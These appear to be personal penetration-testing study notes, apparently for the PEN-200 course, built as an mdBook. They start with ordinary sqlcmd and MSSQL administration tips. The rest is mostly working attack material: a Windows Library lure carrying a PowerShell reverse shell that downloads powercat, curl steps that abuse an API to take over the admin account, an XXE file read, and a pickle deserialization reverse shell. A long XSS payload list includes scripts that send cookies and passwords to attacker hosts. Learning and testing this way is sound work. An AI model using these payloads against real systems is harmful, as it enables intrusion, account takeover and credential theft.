<h2 id="how-to-open-the-sql-prompt"><a class="header" href="#how-to-open-the-sql-prompt">How to Open the SQL Prompt</a></h2>
<p>As a one-off:</p>
<pre><code class="language-bash">sqlcmd -S localhost -U SA
</code></pre>
<p>Or, using ENVs:</p>
<pre><code class="language-bash">source .env
sqlcmd -S "${MSSQL_HOST},${MSSQL_PORT}" -U "${MSSQL_USER}" -P "${MSSQL_PASS}"
</code></pre>
<p>What the <code>.env</code> might look like:</p>
<p><code>.env</code>:</p>
<pre><code class="language-bash">MSSQL_HOST=localhost
MSSQL_PORT=1433
MSSQL_USERNAME=SA
MSSQL_PASSWORD=Password!2#
MSSQL_CATALOG="TestDB"
MSSQL_INSTANCE=""
</code></pre>
<h2 id="how-to-run-a-single-statement"><a class="header" href="#how-to-run-a-single-statement">How to Run a Single Statement</a></h2>
<p>It’s not sufficient to end a line with a <code>;</code>, you have to use <code>GO</code> (without a semicolon).</p>
<pre><code class="language-sql">SELECT 'Hello, World!';
GO
</code></pre>
<h2 id="how-to-run-multi-line-statements"><a class="header" href="#how-to-run-multi-line-statements">How to Run Multi-Line Statements</a></h2>
<p>The <code>sqlcmd</code> cli can be cumbersome to use.</p>
<p>Specifically: <strong>multi-line copy/paste</strong> does not work.</p>
<p>You may be better off to put statements into a script, and then run the script, like this:</p>
<pre><code class="language-bash">sqlcmd -S localhost,1433 -U SA -i foo.sql
</code></pre>
<pre><code class="language-bash">source .env
sqlcmd -S "${MSSQL_HOST},${MSSQL_PORT}" -U "${MSSQL_USER}" -P "${MSSQL_PASS}" -i ${1}
</code></pre>
<h3 id="cheat-script-the-script"><a class="header" href="#cheat-script-the-script">Cheat: Script the Script</a></h3>
<p>To make this a bit easier for myself, I do this:</p>
<p><code>mssqldo.sh</code>:</p>
<pre><code class="language-bash">#!/bin/bash
set -e
set -u

source .env

my_sql_file="${1}"
sqlcmd \
  -S "${MSSQL_HOST},${MSSQL_PORT}" \
  -U "${MSSQL_USER}" \
  -P "${MSSQL_PASS}" \
  -i "${my_sql_file}"
</code></pre>
<p>Make executable:</p>
<pre><code class="language-bash">chmod a+x mssqldo.sh
</code></pre>
<p>Usage:</p>
<pre><code class="language-bash">./mssqldo.sh foo.sql
</code></pre>
<h2 id="how-to-show-all-databases"><a class="header" href="#how-to-show-all-databases">How to Show all Databases</a></h2>
<pre><code class="language-sql">SELECT name, database_id, create_date FROM sys.databases;

GO
</code></pre>
<p>Note: Microsoft calls a database a “catalog”, half of the time anyway.</p>
<h2 id="how-to-show-all-tables"><a class="header" href="#how-to-show-all-tables">How to Show all Tables</a></h2>
<p>All tables in a database:</p>
<pre><code class="language-sql">SELECT table_name, table_schema, table_type
    FROM information_schema.tables
    WHERE table_catalog = 'TestDB'
    ORDER BY table_name ASC;

GO
</code></pre>
<p>All tables across all databases:</p>
<pre><code class="language-sql">SELECT *
    FROM information_schema.tables
    ORDER BY table_name ASC;

GO
</code></pre>
<p>See <a href="https://www.databasestar.com/sql-list-tables/">https://www.databasestar.com/sql-list-tables/</a>.</p>
<h2 id="how-to-describe-columns-of-a-table"><a class="header" href="#how-to-describe-columns-of-a-table">How to Describe Columns of a Table</a></h2>
<pre><code class="language-sql">USE TestDB
EXEC sp_columns @table_name = N'MyTable';
</code></pre>
<pre><code class="language-sql">EXEC TestDB.dbo.sp_columns MyTable;
</code></pre>
<p>However, you can’t treat the result as a table from which to query. So if you want to narrow down the result and select specific columns, it gets a little complicated - you have to turn on some special options run a linked server query to itself. It’s not <em>that</em> complicated, but it’s just not obvious.</p>
<p>See also:</p>
<ul>
<li><a href="https://database.guide/how-to-select-a-subset-of-columns-from-a-stored-procedures-result-set-t-sql/">https://database.guide/how-to-select-a-subset-of-columns-from-a-stored-procedures-result-set-t-sql/</a></li>
</ul>
<h2 id="how-to-create-a-read-only-user"><a class="header" href="#how-to-create-a-read-only-user">How to create a Read-Only User</a></h2>
<pre><code class="language-sql">USE master;
CREATE LOGIN mynewuser_ro WITH PASSWORD='xxxxx', DEFAULT_DATABASE=TestDB, CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF;

USE TestDB;
CREATE USER mynewuser_ro FOR LOGIN mynewuser_ro;
ALTER USER mynewuser_ro WITH DEFAULT_SCHEMA=db_datareader;
EXEC sp_addrolemember N'db_datareader', N'mynewuser_ro';
GRANT SELECT ON sys.database_files TO mynewuser_ro;

GO
</code></pre>
<p>See <a href="https://docs.informatica.com/complex-event-processing/informatica-proactive-monitoring/3-0-hotfix-1/installation-guide/pre-installation/before-you-install/prepare-the-databases/powercenter-repository-database-requirements/create-a-read-only-user-in-microsoft-sql-server.html">https://docs.informatica.com/complex-event-processing/informatica-proactive-monitoring/3-0-hotfix-1/installation-guide/pre-installation/before-you-install/prepare-the-databases/powercenter-repository-database-requirements/create-a-read-only-user-in-microsoft-sql-server.html</a> - but *<strong>note</strong>: those instructions <em>actually</em> create a user with <strong>Read-Write</strong> access!</p>
<p>Also, that user will have access to certain other tables than the database to which it is granted access. See the comments at <a href="https://stackoverflow.com/questions/16211717/best-way-to-create-sql-user-with-read-only-permissions">https://stackoverflow.com/questions/16211717/best-way-to-create-sql-user-with-read-only-permissions</a>.</p>
<h3 id="how-to-generate-a-random-password"><a class="header" href="#how-to-generate-a-random-password">How to Generate a Random Password</a></h3>
<p>This is more of a general Linux tip, but whatever… :)</p>
<pre><code class="language-bash">xxd -l16 -ps /dev/urandom
</code></pre>
<pre><code class="language-txt">0fc105b21019610009afa03eb55c8203
</code></pre>
<p>See <a href="https://therootcompany.com/blog/how-to-generate-secure-random-strings/">https://therootcompany.com/blog/how-to-generate-secure-random-strings/</a>.</p>
<h2 id="how-to-grant-write-access"><a class="header" href="#how-to-grant-write-access">How to Grant Write Access</a></h2>
<p>You must be logged in as <code>SA</code>, of course.</p>
<pre><code class="language-sql">USE TestDB;

GRANT CREATE TABLE TO mynewuser_rw;
GRANT DELETE,INSERT TO mynewuser_rw;
</code></pre>
<h2 id="how-to-enable-linked-server-data-access"><a class="header" href="#how-to-enable-linked-server-data-access">How to Enable Linked Server Data Access</a></h2>
<p>This is for running certain special functions and commands, such as <code>OPENQUERY</code>, <code>OPENROWSET</code> etc.</p>
<pre><code class="language-sql">EXEC sp_serveroption
  @server = 'SQLSRVR',
  @optname = 'DATA ACCESS',
  @optvalue = 'TRUE';
</code></pre>
<p>Your server name is probably <code>SQLSRVR</code>, but you can maybe find out for sure with <code>SELECT @@SERVERNAME</code>;</p>
<p>See also:</p>
<ul>
<li><a href="https://database.guide/how-to-enable-disable-data-access-in-sql-server-t-sql-examples/">https://database.guide/how-to-enable-disable-data-access-in-sql-server-t-sql-examples/</a></li>
<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-serveroption-transact-sql?view=sql-server-ver15">https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-serveroption-transact-sql?view=sql-server-ver15</a></li>
<li><a href="https://dba.stackexchange.com/questions/115201/get-servername-from-linked-server">https://dba.stackexchange.com/questions/115201/get-servername-from-linked-server</a></li>
</ul>
<h2 id="ssh-port-forward--proxy--relay"><a class="header" href="#ssh-port-forward--proxy--relay">SSH Port Forward / Proxy / Relay</a></h2>
<p>For this scenario:</p>
<ol>
<li>You have a Windows Server <em>inside</em> the private network
<ul>
<li><code>10.0.0.10</code></li>
</ul>
</li>
<li>You have a Linux Server on the same network, but with ssh already port-forwarded publicly
<ul>
<li><code>jumpbox.example.com</code></li>
</ul>
</li>
<li>You want to access SQL server from you Apple laptop</li>
</ol>
<p>You could make the Windows’ server port 1433 appear through the linux box to your laptop as port 1443 locally - or any port really. For illustrative purposes I’ll actually use port 14330:</p>
<pre><code class="language-bash">ssh -L 14330:10.0.0.10:1433 jumpbox.example.com
</code></pre>
<p>You could also put this in your ssh config so you don’t havet to go looking that up all the time:</p>
<p><code>.ssh/config</code>:</p>
<pre><code class="language-ssh">Host jumpbox
    Port 22
    Hostname jumpbox.example.com
    LocalForward 14330 10.0.0.10:1433
</code></pre>
<pre><code class="language-bash">ssh -N jumpbox
# See also https://unix.stackexchange.com/a/100863/45554
</code></pre>
<p>Then update the port used by sqlcmd:</p>
<pre><code class="language-bash">sqlcmd -S localhost,14330 -U SA
</code></pre>
<h2 id="how-to-export-to-sql"><a class="header" href="#how-to-export-to-sql">How to export to SQL</a></h2>
<p>You can’t. You have to use the GUI tools for that.</p>
<p>See <a href="https://dba.stackexchange.com/a/291907/230109">https://dba.stackexchange.com/a/291907/230109</a>.</p>
<h2 id="how-to-export-to-csv"><a class="header" href="#how-to-export-to-csv">How to export to CSV</a></h2>
<p><strong>You can’t.</strong> At least not with <code>sqlcmd</code>.</p>
<p>Use <a href="https://github.com/therootcompany/mssql-to-csv/releases">mssql-to-csv</a> instead.</p>
<p>But there is a hack that mostly works if you don’t need to escape.</p>
<pre><code class="language-bash">#!/bin/bash

set -e
set -u

source .env

# To remove header: -h-1
sqlcmd -S "${MSSQL_HOST}" -U "${MSSQL_USER}" -P "${MSSQL_PASS}" -i "${1}" -s"," -W -w 999 \
	|
		grep '[a-zA-Z0-9_-]' |
		grep -v 'rows affected'
</code></pre>
<p>See</p>
<h2 id="how-to-do-a-backup"><a class="header" href="#how-to-do-a-backup">How to do a Backup</a></h2>
<p><strong>You can’t!</strong></p>
<p>Running a backup with <code>sqlcmd</code> will produce a backup <strong>on the server</strong>, not the client.</p>
<pre><code class="language-sql">USE TestDB;

BACKUP DATABASE [TestDB]
    TO DISK = N'C:\Backups\MS-SQL-Server-Test-DB.bak'
    WITH NOFORMAT, NOINIT,
    NAME = N'MS-SQL-Server-Test-DB Full Database Backup',
    SKIP, NOREWIND, NOUNLOAD,  STATS = 10;

GO
</code></pre>
<p><strong>However</strong>, it may be possible to create a CIFS/SMB share (Windows share) on Linux, use <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15"><code>xp_cmdshell</code></a> to <a href="https://www.getfilecloud.com/supportdocs/display/cloud/How+to+Mount+CIFS+Shares+from+Windows+Command+Line">mount it</a>, and then run the backup from the server to client over the network share.</p>
<p>See also:</p>
<ul>
<li><a href="https://dba.stackexchange.com/questions/291790/how-to-create-sql-server-backup-from-windows-server-to-linux-client-with-sqlcmd/291907#291907">https://dba.stackexchange.com/questions/291790/how-to-create-sql-server-backup-from-windows-server-to-linux-client-with-sqlcmd/291907#291907</a> (read the comments)</li>
<li><a href="https://www.davidklee.net/2017/08/08/sql-server-on-linux-series-backing-up-over-the-network/">https://www.davidklee.net/2017/08/08/sql-server-on-linux-series-backing-up-over-the-network/</a></li>
<li><a href="http://joshburnstech.com/2018/09/map-network-drive-sqlserver/">http://joshburnstech.com/2018/09/map-network-drive-sqlserver/</a></li>
</ul>
<h2 id="how-to-give-a-user-backup-privileges"><a class="header" href="#how-to-give-a-user-backup-privileges">How to Give a User Backup Privileges</a></h2>
<pre><code class="language-sql">USE TestDB;

EXEC sp_addrolemember N'db_backupoperator', 'mynewuser_ro';

GO
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="windows-libraries--abusing-apis"><a class="header" href="#windows-libraries--abusing-apis">Windows Libraries &amp; Abusing APIs</a></h2>
<h3 id="windows-libraries"><a class="header" href="#windows-libraries">Windows Libraries</a></h3>
<pre><code>pip3 install wsgidav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous -root /home/kali/webdav/

Make a file named "config.Library.ms"

&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt; &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt; &lt;version&gt;6&lt;/version&gt; &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt; &lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt; &lt;templateInfo&gt; &lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt; &lt;/templateInfo&gt; &lt;searchConnectorDescriptionList&gt; &lt;searchConnectorDescription&gt; &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt; &lt;isSupported&gt;false&lt;/isSupported&gt; &lt;simpleLocation&gt; &lt;url&gt;http://192.168.119.2&lt;/url&gt; &lt;/simpleLocation&gt; &lt;/searchConnectorDescription&gt; &lt;/searchConnectorDescriptionList&gt; &lt;/libraryDescription&gt;

Drop a powershell reverse shell into a shortcut key in the same folder, hope they click it:

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.219:9090/powercat.ps1'); powercat -c 192.168.45.219 -p 4444 -e powershell"


</code></pre>
<h3 id="abusing-apis"><a class="header" href="#abusing-apis">Abusing APIs</a></h3>
<p>I'd recommend reading it straight from the pen-200 guide. Essentially, through a series of commands it is discovered you can abuse an API to create a user.</p>
<pre><code>#AbusingAPIs

gobuster dir -u http://192.168.208.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

curl -i http://192.168.208.16:5002/users/v1

gobuster dir -u http://192.168.208.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

curl -i http://192.168.208.16:5002/users/v1/admin/password

curl -i http://192.168.208.16:5002/users/v1/login

curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.208.16:5002/users/v1/login

curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.208.16:5002/users/v1/register

curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.208.16:5002/users/v1/register

curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.208.16:5002/users/v1/login

curl  \
  'http://192.168.208.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

curl -X 'PUT' \
  'http://192.168.208.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.208.16:5002/users/v1/login
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="xxe--xss--insecure-deserialization"><a class="header" href="#xxe--xss--insecure-deserialization">XXE &amp; XSS &amp; Insecure Deserialization</a></h2>
<h3 id="links-10"><a class="header" href="#links-10">Links</a></h3>
<ul>
<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/">PayLoad All The Things XXE</a></li>
<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/">PayLoad All The Things XSS</a></li>
</ul>
<h3 id="xxe-injection"><a class="header" href="#xxe-injection">XXE Injection</a></h3>
<pre><code>//Ability to read files on system
//XML elements, what are they?

touch test.xml
	test data

Upload the test file to the XML site

On Burp get request log
Send to repeater

change body of file to what it wants to see the 200
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
  &lt;!DOCTYPE foo [  
  &lt;!ELEMENT foo ANY &gt;
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
&lt;Wrapper&gt;
	&lt;Author&gt;author&lt;/Author&gt;
	&lt;Subject&gt;&amp;xxe&lt;/Subject&gt;
	&lt;Content&gt;content&lt;/Content&gt;
&lt;/Wrapper&gt;




</code></pre>
<h3 id="xxs-injection"><a class="header" href="#xxs-injection">XXS Injection</a></h3>
<pre><code>This PHP function is responsible for parsing various HTTP request headers, including the UserAgent, which is saved in the useragent record value. Next, each time a WordPress administrator loads the Visitor plugin, the function will execute the following portion of code from start.php:

$i=count(VST_get_records($date_start, $date_finish)); foreach(VST_get_records($date_start, $date_finish) as $record) { echo ' &lt;tr class="active" &gt; &lt;td scope="row" &gt;'.$i.'&lt;/td&gt; &lt;td scope="row" &gt;'.date_format(date_create($record-&gt;datetime), get_option("links_updated_date_format")).'&lt;/td&gt; &lt;td scope="row" &gt;'.$record-&gt;patch.'&lt;/td&gt; &lt;td scope="row" &gt;&lt;a href="https://www.geolocation.com/es?ip='.$record&gt;ip.'#ipresult"&gt;'.$record-&gt;ip.'&lt;/a&gt;&lt;/td&gt; &lt;td&gt;'.$record-&gt;useragent.'&lt;/td&gt; &lt;/tr&gt;'; $i--; }

</code></pre>
<p><img src="XSSExample.png" alt="XSS Example" /></p>
<p><img src="XSSFlowChart.png" alt="XSS Flow Chart" /></p>
<h3 id="insecure-deserialization"><a class="header" href="#insecure-deserialization">Insecure Deserialization</a></h3>
<pre><code>
import pickle
from base64 import urlsafe_b54encode as b64encode

RUNME = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f"""


class ElevateSecurity(object):
	def __reduce__(self):
		import os
		return (os.system,(RUNME,))
print b64encode(pickle.dumps(ElevateSecurity()))


Take the output of this and put in the burp repeater for the xml upload site

Go to IP/newpost
Change from GET to POST
Just change content-type to text</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cross-site-scripting"><a class="header" href="#cross-site-scripting">Cross-site Scripting</a></h1>
<p>Introduction</p>
<p>XSS happens when the user input is given as output without sanitization on input and output.</p>
<ul>
<li>Find the blacklisted/filtered characters. You can use XSS locators for this:</li>
</ul>
<pre><code class="language-none">'';! - "&lt;XSS&gt;=&amp;{()}
</code></pre>
<p>Goals of XSS:</p>
<ol>
<li>
<p>Cookie stealing</p>
</li>
<li>
<p>Complete control on browser</p>
</li>
<li>
<p>Initiating an exploitation phase against browser plugins first and and the machine</p>
</li>
<li>
<p>Keylogging</p>
</li>
</ol>
<p>3 types:</p>
<ol>
<li>
<p>Reflected (Server side code is vulnerable)</p>
</li>
<li>
<p>Stored</p>
</li>
<li>
<p>DOM (Client side code is vulnerable)</p>
</li>
</ol>
<p>Reflected XSS</p>
<p>Victims bring the payload in the HTTP request to the vulnerable website. Then the browser renders the payload in the victim's context.</p>
<p><code>https://insecure-website.com/search?term=gift</code></p>
<p>The application echoes the supplied search term in the response to this URL:</p>
<p>You searched for: gift</p>
<pre><code>https://insecure-website.com/status?message=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;
</code></pre>
<p>Persistent XSS</p>
<p>Persistent XSS is able to deface a webpage.</p>
<p>This type of attack does not need the victims to click on any links. It happens when a victim browses a vulnerable page injected with persistent XSS code.</p>
<p>Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:</p>
<pre><code>POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&amp;comment=This+post+was+extremely+helpful.&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net
</code></pre>
<p>url encoded with xss:</p>
<pre><code>comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
</code></pre>
<p>DOM-based XSS</p>
<p>Make use of the HTML tree.</p>
<p>The document.write sink works with script elements, so you can use a simple payload such as:</p>
<pre><code>document.write('... &lt;script&gt;alert(document.domain)&lt;/script&gt; ...');
</code></pre>
<p>The innerHTML sink doesn’t accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements. For example:</p>
<pre><code>element.innerHTML='... &lt;img src=1 onerror=alert(document.domain)&gt; ...'
</code></pre>
<p>Find XSS</p>
<p>Input could be:</p>
<ol>
<li>
<p>GET/POST variables</p>
</li>
<li>
<p>COOKIE</p>
</li>
<li>
<p>HTTP HEADERS</p>
</li>
</ol>
<p>First, try to inject <code>&lt;plaintext&gt;</code> tag to see if the page will be broken after.</p>
<p>Then, check if we can inject script using <code>&lt;script&gt;</code> or using one of the DOM events (e.g. <code>&lt;h1&gt;</code>).</p>
<p>When inspecting the source code, look for all the points where the application outputs data (totally / partially) supplied by the user without sanitization and tracking it back to the source where it is retrieved for the first time.</p>
<h3 id="xss-between-html-tags"><a class="header" href="#xss-between-html-tags">XSS between html tags</a></h3>
<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;img src=1 onerror=alert(1)&gt;
</code></pre>
<h3 id="xss-in-html-tag-attributes"><a class="header" href="#xss-in-html-tag-attributes">xss in html tag attributes</a></h3>
<p>When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:</p>
<pre><code>"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
</code></pre>
<p>More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:</p>
<pre><code>" autofocus onfocus=alert(document.domain) x="
</code></pre>
<pre><code>&lt;a href="javascript:alert(document.domain)"&gt;
</code></pre>
<h3 id="xss-in-javascript"><a class="header" href="#xss-in-javascript">xss in javascript</a></h3>
<p><strong>Terminating the existing script</strong> In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:</p>
<pre><code>&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;
</code></pre>
<p><strong>Breaking out of a JavaScript string</strong></p>
<pre><code>'-alert(document.domain)-'
';alert(document.domain)//
</code></pre>
<p><strong>Making use of HTML-encoding</strong></p>
<p>When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters. For example, if the XSS context is as follows:</p>
<pre><code>&lt;a href="#" onclick="... var input='controllable data here'; ..."&gt;
</code></pre>
<p>and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:</p>
<pre><code>&amp;apos;-alert(document.domain)-&amp;apos;
</code></pre>
<p>The ' sequence is an HTML entity representing an apostrophe or single quote</p>
<p><strong>XSS in JavaScript template literals</strong> JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${…} syntax.</p>
<p>For example, the following script will print a welcome message that includes the user’s display name:</p>
<p>document.getElementById(‘message’).innerText = <code>Welcome, ${user.displayName}.</code>;</p>
<p>When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${…} syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:</p>
<pre><code>&lt;script&gt;
...
var input = `controllable data here`;
...
&lt;/script&gt;
</code></pre>
<p>then you can use the following payload to execute JavaScript without terminating the template literal:</p>
<pre><code>${alert(document.domain)}
</code></pre>
<p>XSS tricks</p>
<p>Simple: <code>&lt;script&gt;alert('xss')&lt;/script&gt;</code> IMG tag onload: <code>&lt;img src="xxx" onload="javascript:alert('xss')"&gt;</code> <code>&lt;img src="xxx" onload="alert('xss')"&gt;</code> <code>&lt;img src="xxx" onload="alert(String.fromCharCode(88,83,83))"&gt;</code></p>
<p>XSS Exploit</p>
<p>Cookie Stealing</p>
<ol>
<li>
<p>Find injection point</p>
</li>
<li>
<p>Read the cookie using JS</p>
</li>
<li>
<p>Redirect the cookie to attacker server</p>
</li>
<li>
<p>Retrieve and install the stolen cookie on browser</p>
</li>
</ol>
<p>Example:</p>
<pre><code>&lt;script&gt;
var i = new Image(); 
i.src="http://attacker.site/steal.php?q="%2bdocument.cookie;
&lt;/script&gt;
</code></pre>
<p>Note <code>%2b</code> = <code>+</code></p>
<p>The <code>steal.php</code> could be:</p>
<pre><code>$fn = "log.txt";
$fh = fopen($fn, 'a');
$cookie = $_GET['q'];
fwrite($fh, $cookie);
fclose($fh)
</code></pre>
<p>We can also do some other thing, for example, change <code>form action</code> location:</p>
<pre><code>document.forms[0].action="http://attacker.site/steal.php";
</code></pre>
<h2 id="steal-cookies"><a class="header" href="#steal-cookies">steal cookies</a></h2>
<pre><code>&lt;script&gt;
new Image().src="http://192.168.30.5:81/bogus.php?ouput="+document.cookie;
&lt;/script&gt;
</code></pre>
<pre><code>&lt;script&gt;
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
&lt;/script&gt;
</code></pre>
<h2 id="capture-passwords"><a class="header" href="#capture-passwords">capture passwords</a></h2>
<pre><code>&lt;input name=username id=username&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"&gt;
</code></pre>
<p>Web Defacement</p>
<ul>
<li>
<p>Make use of Persistent XSS</p>
</li>
<li>
<p>Change the appearance of the web by manipulating the DOM</p>
</li>
</ul>
<pre><code>document.body.innerHTML="&lt;h1&gt;What!&lt;/h1&gt;";
</code></pre>
<p>Phishing</p>
<ul>
<li>By modifying the form action's destination</li>
</ul>
<pre><code>document.forms[0].action="https://hacker.site/thanks.php";
</code></pre>
<hr />
<h3 id="top-xss-payloads"><a class="header" href="#top-xss-payloads">Top XSS Payloads</a></h3>
<p>1-<code>&lt;script&gt;alert("1")&lt;/script&gt;</code></p>
<p>2-<code>&lt;sCript&gt; alert("bypassing simple filters") &lt;/sCRIpt&gt;</code></p>
<p>3-<code>&lt;a onmouseover="alert(document.cookie)"&gt;xxs link&lt;/a&gt; | &lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;</code></p>
<p>4-<code>&lt;img src='zzzz' onerror='alert(1)' /&gt;</code></p>
<p>5-<code>&lt;div style="color:red" onclick=alert('xss')&gt;</code>| Coloring is adding to see the div</p>
<p>6-<code>&lt;div style="color:green" onmouseover=alert('xss') &gt;</code></p>
<p>7-<code>&lt;script&gt;console.log("test")&lt;/script&gt;</code> <strong>Testing if the word "alert" is allowed in the script</strong></p>
<p>8- <code>&lt;img src="cc" onerror=eval(String'fromCharCode')&gt;</code> |<strong>alert is not allowed</strong></p>
<p>9-<code>&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code>|<strong>escaping script tags to excute the payload</strong></p>
<p>10-<code>';alert('xss');//</code>| The apostrophe character is used to escape in PHP htmlentities**'**</p>
<p>11-<code>' onerror=alert('xss');&gt;</code> | use this if the vulnerability in the image</p>
<p>12-<code>#&lt;script&gt;alert(1)&lt;/script&gt;</code> | <strong>exploiting the DOM xss with hash.substring</strong></p>
<p>13-<code>#javascript:alert(1)</code> | <strong>exploiting the DOM xss with hash.substring</strong></p>
<p>14-<code>" onmouseover="alert(1)</code> |</p>
<p>15-<code>&lt;script&gt; var i = new Image(); i.src="http://URL/get.php?cookie="+escape(document.cookie)&lt;/script&gt;</code>|<strong>to get cookie</strong></p>
<p>16-<code>“&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;</code>|<strong>to get cookie</strong></p>
<p>17-<code>“&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;</code></p>
<p>18-<code>“%3e%3cscript%3ealert(document.cookie)%3c/script%3e</code></p>
<p>19-<code>“&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
<p>20-<code>%00“&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<p>21-<code>&lt;object data=”data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;”&gt;</code></p>
<p>22-<code>&lt;object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”&gt;</code></p>
<p>23-<code>&lt;a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”&gt;</code></p>
<p>24-<code>Click here&lt;/a&gt;</code></p>
<p>25-<code>&lt;img o[%00]nerror=alert(1) src=a&gt;</code>| to bypass attribute filters</p>
<p>26-<code>&lt;img onerror=”alert(1)”src=a&gt;</code>| attribute delimiter</p>
<p>27-<code>&lt;img onerror=’alert(1)’src=a&gt;</code>| attribute delimiter</p>
<p>28-<code>&lt;img onerror=</code>alert(1)<code>src=a&gt;</code>| attribute delimiter</p>
<p>29-<code>&lt;img onerror=a[%00]lert(1) src=a&gt;</code>| attribute value</p>
<p>30-<code>&lt;img onerror=a&amp;#x6c;ert(1) src=a&gt;</code>| attribute value</p>
<p>31- <code>&lt;img src='nevermind' onerror="alert('XSS');" /&gt;</code> <strong>| DOM</strong></p>
<hr />
<h2 id="cross-site-scripting-xss-cheatsheet"><a class="header" href="#cross-site-scripting-xss-cheatsheet">Cross-Site Scripting (XSS) Cheatsheet</a></h2>
<pre><code class="language-none">--------------------------------------------------------------------
XSS Locators:
'';!--"&lt;XSS&gt;=&amp;{()}
--------------------------------------------------------------------
Classic Payloads:
&lt;svg onload=alert(1)&gt;
"&gt;&lt;svg onload=alert(1)&gt;
&lt;iframe src="javascript:alert(1)"&gt;
"&gt;&lt;script src=data:&amp;comma;alert(1)//
--------------------------------------------------------------------
script tag filter bypass:
&lt;svg/onload=alert(1)&gt;
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;script     &gt;alert(1)&lt;/script&gt;
